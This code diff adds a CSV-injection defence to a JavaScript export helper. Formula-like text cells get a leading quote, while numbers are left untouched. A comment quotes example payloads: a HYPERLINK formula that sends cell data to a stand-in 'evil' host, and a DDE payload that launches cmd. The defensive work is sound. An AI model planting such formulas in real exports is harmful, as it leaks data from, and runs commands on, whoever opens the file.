@@ -213,11 +213,27 @@ export const stampYMD = (dateInput = new Date()) =>
 // CSV export
 // ---------------------------------------------------------------------------
 
+// A cell that begins with = + - @ (or a tab / line break) is a FORMULA to Excel and Sheets, whatever the file was meant to hold.
+// A customer called `=HYPERLINK("http://evil/?"&A2,"Open")` or `@SUM(1+1)*cmd|' /C calc'!A0` would run on whoever opens the export.
+// The standard defence (OWASP "CSV injection") is a leading single quote, which makes the cell text. Numbers must not be touched:
+// a negative amount is a number, not an attack, and `-1,234.50` has to stay summable. So a cell that is only a (signed, grouped,
+// decimal, percent) number, or only dashes used as "nothing here", is left alone; a real number (typeof number) never reaches this.
+// \u00a0 is a non-breaking space, written as an escape: a spreadsheet skips one before a formula, and a literal one here
+// reads as an ordinary space to anyone editing this line (and trips the "irregular whitespace" lint rule).
+const FORMULA_START = /^[\s\u00a0]*[=+\-@]|^[\t\r\n]/;
+const PLAIN_NUMBER = /^[-+]?(\d{1,3}(,\d{3})+|\d+)?(\.\d+)?%?$/;
+export const neutraliseFormula = (text) => {
+  if (!FORMULA_START.test(text)) return text;
+  const bare = text.trim();
+  if (/^[-+]+$/.test(bare) || (/\d/.test(bare) && PLAIN_NUMBER.test(bare))) return text;
+  return `'${text}`;
+};
+
 // Quote a cell when it contains a delimiter, quote or newline; double inner quotes.
 // Without this, a vendor name containing a comma shifts every later column.
 const csvCell = (value) => {
   if (value === null || value === undefined) return '';
-  const s = String(value);
+  const s = typeof value === 'number' ? String(value) : neutraliseFormula(String(value));
   return /["',\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 };
 
